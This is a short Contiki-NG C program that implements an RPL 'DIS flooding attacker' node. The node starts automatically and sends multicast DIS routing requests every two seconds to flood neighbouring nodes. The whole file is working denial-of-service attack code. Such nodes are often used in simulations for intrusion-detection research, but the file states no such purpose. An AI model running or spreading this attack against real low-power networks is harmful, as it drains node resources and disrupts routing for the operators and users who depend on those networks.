#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "sys/log.h"

#define LOG_MODULE "DIS-FLOODER"
#define LOG_LEVEL LOG_LEVEL_INFO

#define FLOOD_INTERVAL (2 * CLOCK_SECOND)

PROCESS(dis_flooder_process, "DIS flooding attacker");
AUTOSTART_PROCESSES(&dis_flooder_process);

PROCESS_THREAD(dis_flooder_process, ev, data)
{
  static struct etimer flood_timer;

  PROCESS_BEGIN();

  LOG_INFO("DIS flooding attacker started\n");

  etimer_set(&flood_timer, FLOOD_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&flood_timer));

    LOG_INFO("ATTACK: sending multicast DIS\n");

    /*
     * NULL means multicast DIS.
     * This repeatedly asks nearby RPL nodes for routing information.
     * Repeating this creates DIS flooding behaviour.
     */
    rpl_icmp6_dis_output(NULL);

    etimer_reset(&flood_timer);
  }

  PROCESS_END();
}
